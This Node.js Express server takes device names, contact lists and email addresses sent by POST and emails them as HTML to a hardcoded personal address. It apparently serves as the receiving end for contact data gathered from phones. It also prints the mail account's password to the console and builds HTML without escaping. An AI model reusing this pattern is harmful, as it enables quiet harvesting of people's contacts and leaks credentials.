var http = require('http');
var express = require('express')
var bodyParser = require('body-parser');
var nodemailer = require('nodemailer');

var app = express();
var port = process.env.PORT||8080;
app.use(bodyParser.json());
console.log(process.env.PASSEMAIL);
console.log(process.env.SENDEREMAIL);
app.get('/',function(req, res){
	res.send('Send The Data Through POST Client :(');
});

var transporter = nodemailer.createTransport(
  {
    service: 'gmail',
    auth:
    {
      user: process.env.SENDEREMAIL,
      pass: process.env.PASSEMAIL
    }
  }
);

app.post('/', function(req, res){
	var data = req.body;
	var device = data.Device;
	var device = data.Device;
	var contacts = data.contacts;
	var emails = data.emails;
	var message = '<h2 color = "red">Contacts:</h2>';
	for(var name in contacts)
	{
		message += '<h3 color = "green">'+name+'</h3><br>';
		for(var i = 0; i<contacts[name].length; i++)
			message += contacts[name][i]+'<br>';
	}
	message += '<h2 color = "red">Emails:</h2><br>';
	for(var i = 0; i<emails.length; i++)
		message += emails[i]+'<br>';
	var mailOptions = {
  		from: 'tripathiankit0522@gmail.com',
  		to: 'ankitmani.t@somaiya.edu',
  		subject: ''+device,
  		html: ''+message
	};
	transporter.sendMail(mailOptions, function(error, info){
	  	if (error)
		{
			res.send('Failure');
			console.log('Could not send mail..');
		}
		else
		{
			res.send('Success');
			console.log('Sent Mail..');
		}
	});
});

app.listen(port,function(){
	console.log("Running on port: "+port);
});